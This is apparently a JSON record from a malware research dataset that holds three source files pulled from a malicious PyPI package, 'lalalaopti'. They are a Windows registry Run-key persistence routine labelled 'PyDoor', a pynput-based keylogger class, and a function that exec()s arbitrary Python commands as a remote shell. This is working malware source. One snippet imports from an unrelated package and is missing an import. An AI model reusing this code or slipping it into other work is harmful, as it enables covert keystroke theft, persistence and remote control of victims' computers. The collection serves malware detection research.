[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/persistance.py",
    "malicious_code": "import os\nimport sys\nimport platform\nfrom typing import Union\n\nif platform.system() == 'Windows':\n    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue\n    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ\n    STARTUP_REG_NAME = 'PyDoor'\n\n\ndef add_startup() -> Union[str, None]:\n    \"\"\" Add Client to startup \"\"\"\n    # returns None/error\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    if getattr(sys, 'frozen', False):\n        path = sys.executable\n    elif __file__:\n        path = os.path.abspath(__file__)\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n            0, KEY_ALL_ACCESS)\n        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)\n        CloseKey(key)\n    except Exception as error:\n        return error\n\n\ndef remove_startup() -> Union[str, None]:\n    \"\"\" Remove Client from Startup \"\"\"\n    # returns None/error\n    if platform.system() != 'Windows':\n        return 'Startup feature is only for Windows'\n    try:\n        key = OpenKey(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n            0, KEY_ALL_ACCESS)\n        DeleteValue(key, STARTUP_REG_NAME)\n        CloseKey(key)\n    except FileNotFoundError:\n        pass\n    except WindowsError as error:\n        return error\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/keylogger.py",
    "malicious_code": "import logging\nimport threading\n\ndef onkeyboardevent(event):\n    \"\"\" On Keyboard Event\"\"\"\n    logging.info(\"%s\", event)\n\nclass Keylogger:\n    \"\"\" Keylogger \"\"\"\n\n    def __init__(self) -> None:\n        \"\"\"\n        Check keylogger state from log\n        then enable or disable it accordingly\n        \"\"\"\n        try:\n            from pynput.keyboard import Listener\n        except ImportError:\n            self.runnable = False\n        else:\n            self.runnable = True\n            self.listener = Listener(on_press=onkeyboardevent)\n\n    def start(self) -> bool:\n        \"\"\" Start keylogger \"\"\"\n        if not self.runnable:\n            logging.error('pynput not found, could not start keylogger')\n            return False\n        if not self.listener.running:\n            self.listener.start()\n            logging.info('Started Keylogger')\n        return True\n\n    def stop(self) -> bool:\n        \"\"\" Attempt to stop the keylogger \"\"\"\n        if not self.runnable:\n            logging.info('pynput not found')\n            return False\n        if self.listener.running:\n            self.listener.stop()\n            logging.info('Stopped Keylogger')\n            threading.Thread.__init__(self.listener)\n        return True\n\n    def state(self) -> bool:\n        \"\"\" Get the state of the keylogger \"\"\"\n        return self.listener.running\n"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/lalalaopti-1.0.1/lalalaopti-1.0.1/lalalaopti/modules/pyshell.py",
    "malicious_code": "import sys\nfrom io import StringIO\nfrom gogogolokl.utils.errors import errors\n\ndef pyshell(command: str) -> Tuple[str, str]:\n    \"\"\" exec python commands \"\"\"\n    old_stdout = sys.stdout\n    redirected_output = sys.stdout = StringIO()\n    error = None\n    try:\n        exec(command)\n    except Exception as err:\n        error = errors(err, line=False)\n    finally:\n        sys.stdout = old_stdout\n\n    return redirected_output.getvalue(), error"
  }
]